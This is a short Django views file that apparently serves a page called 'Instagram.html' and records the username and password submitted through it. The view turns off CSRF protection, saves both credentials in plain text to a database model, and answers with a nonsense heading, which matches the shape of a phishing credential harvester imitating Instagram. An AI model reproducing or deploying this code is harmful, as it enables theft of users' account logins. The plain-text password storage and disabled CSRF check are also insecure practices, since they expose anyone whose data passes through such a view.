from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from .models import user
from django.http import HttpResponse



# Create your views here.

@csrf_exempt
def main(request):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        created = user(username=username, password=password)
        created.save()
        return HttpResponse("<h1>huuuuuuuuuiiuyuty</h1>")
    else:
        return render(request, 'Instagram.html')
